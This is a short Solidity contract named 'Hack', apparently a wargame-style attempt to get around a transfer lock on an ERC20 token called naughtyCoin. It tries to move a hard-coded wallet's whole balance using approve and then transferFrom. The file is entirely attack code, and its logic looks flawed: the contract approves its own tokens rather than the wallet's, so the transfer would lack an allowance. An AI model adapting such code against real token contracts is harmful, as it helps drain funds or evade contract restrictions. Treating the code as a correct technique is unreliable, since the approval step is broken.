// SPDX-License-Identifier: MIT
import '@openzeppelin/contracts/token/ERC20/IERC20.sol';
pragma solidity ^0.8.0;
contract Hack{
    IERC20 public naughtyCoin;
    address myWallet = 0xdB01d94217308046a792D864b16A35837aa52B86;
    constructor(address _address) {
        naughtyCoin = IERC20(_address);
    }
    function balance() public view returns (uint){
        uint amount = naughtyCoin.balanceOf(myWallet);
        return amount;
    }
    function hackContract() public {
        uint balancet = balance();
        bool rt = naughtyCoin.approve(address(this), balancet);
        if(rt) {
            naughtyCoin.transferFrom(myWallet, address(this), balancet);
        }
        
        
    }
    
}